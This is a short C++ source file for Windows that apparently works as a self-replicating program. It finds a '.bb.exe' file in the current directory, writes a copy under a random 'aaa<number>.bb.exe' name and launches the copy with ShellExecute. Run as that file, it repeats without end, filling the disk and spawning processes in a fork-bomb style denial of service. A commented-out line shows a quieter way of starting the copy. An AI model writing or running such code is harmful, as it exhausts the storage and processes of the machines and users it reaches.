#include <dirent.h>
#include <string>
#include <cstdio>
#include <time.h>
#include <cstdlib>
#include <iostream>
#include <fstream>
#include <sys/stat.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <objbase.h>
DIR *dir;
struct dirent *ent;
std::ifstream s;
std::ofstream d;
int proc(){
	dir = opendir("./");
	std::string name;
	while((ent = readdir(dir))!=NULL){
		std::string s (ent->d_name);
		if (s.find(".bb.exe") != std::string::npos && s.find(".swp")==std::string::npos){
			name = s;
			break;
		}
	}
	srand(time(NULL));
	s.open(name,std::ios::binary);
	std::string nname = "aaa"+std::to_string(rand())+".bb.exe";
	d.open(nname,std::ios::binary);
	d << s.rdbuf();
	//chmod (nname.c_str(),mode_t(0775));
	s.close();
	d.close();
	//system(("@echo off && start /b "+nname+"").c_str());
	ShellExecute(NULL, "open", nname.c_str(),NULL,NULL, SW_SHOWNORMAL);
}
int main(){
	proc();
}
